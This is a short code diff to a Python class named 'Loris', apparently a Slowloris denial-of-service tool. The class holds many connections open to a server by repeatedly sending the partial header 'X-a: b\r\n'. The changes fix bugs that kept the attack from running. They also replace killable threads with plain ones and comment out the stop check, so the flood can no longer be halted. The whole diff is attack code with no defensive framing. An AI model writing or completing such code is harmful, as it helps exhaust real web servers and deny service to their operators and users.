@@ -30,8 +30,8 @@ class Loris:
             return
 
         i = 0
-        while i < totalConnections:
-            t = KillableThread(target = self.doConnections)
+        while i < self.totalConnections:
+            t = threading.Thread(target = self.doConnections)
             t.start()
             self.threadList.append(t)
             i += self.totalConnections
@@ -79,8 +79,8 @@ class Loris:
         sockets = [None]  * self.connectionsPerThread
 
         while (True):
-            if self.killed():
-                return
+#            if self.killed():
+#                return
 
             """ Establish connections """
             for i in range(0, self.connectionsPerThread):
@@ -105,7 +105,7 @@ class Loris:
             for i in range(0, self.connectionsPerThread):
                 if working[i] is True:
                     if sockets[i]:
-                        sock = sock[i]
+                        sock = sockets[i]
                         message = "X-a: b\r\n"
                         try:
                             sock.send(message)
